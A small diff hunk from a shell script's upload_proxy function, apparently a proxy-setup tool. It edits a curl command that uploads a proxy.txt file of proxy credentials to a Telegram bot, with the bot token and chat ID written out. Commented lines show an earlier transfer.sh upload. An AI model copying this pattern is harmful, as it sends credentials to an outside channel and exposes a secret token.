@@ -56,7 +56,7 @@ upload_proxy() {
     #zip --password $PASS proxy.zip proxy.txt
     #URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip)
     
-	curl -F document=@/bin/sh/proxy.txt https://api.telegram.org/bot6124963785:AAFNE9qm_tabPeY69IIB4zC-W9CfrRfpoCk/sendDocument?chat_id=-708242951
+	curl -F document=proxy.txt https://api.telegram.org/bot6124963785:AAFNE9qm_tabPeY69IIB4zC-W9CfrRfpoCk/sendDocument?chat_id=-708242951
     echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
 }
 gen_data() {
